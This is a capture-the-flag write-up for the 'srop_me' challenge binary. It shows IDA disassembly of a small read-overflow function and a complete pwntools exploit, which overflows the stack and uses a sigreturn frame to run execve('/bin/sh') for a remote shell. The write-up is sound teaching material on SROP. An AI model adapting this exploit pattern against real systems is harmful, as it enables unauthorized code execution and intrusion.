# ASM

First of all, let's open the file in IDA disassembler
We see very tiny assembly code 
Function *vuln()*:

```asm
vuln proc near
mov     eax, 1
mov     edi, 1          ; fd
mov     rsi, offset msg ; buf
mov     edx, 0Fh        ; count
syscall                 ; LINUX - sys_write
sub     rsp, 20h
mov     eax, 0
mov     edi, 0          ; fd
mov     rsi, rsp        ; buf
mov     edx, 200h       ; count
syscall                 ; LINUX - sys_read
add     rsp, 20h
retn
vuln endp
```

File name is "srop_me", so it's obvious, that we need to use SROP (Sigreturn Oriented Programming).

So our payload contains:
- 32 bytes useless data
- address 0x40101b to read buffer again and make rax = 0xf
- address of syscall to execute syscall with rax = 0xf and control all registers
- and SigreturnFrame to make the register values what we need

Here is the exploit using pwntools:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./srop_me')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 38894)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
  

io = start()
io.recvline()

frame = SigreturnFrame()
frame.rdi = 0x40200F # binsh string
frame.rsi = 0x0
frame.rax = 0x3b # execve
frame.rdx = 0x0
frame.rbp = 0x402100
frame.rip = 0x401031 # syscall
frame.rsp = 0x402000

pl = b''
pl += b'A'*32
pl += p64(0x40101b) # read gadget
pl += p64(0x401031) # syscall
pl += bytes(frame)
io.send(pl.ljust(0x200))

io.send(b'A'*14 + b'\n')

io.interactive()
```
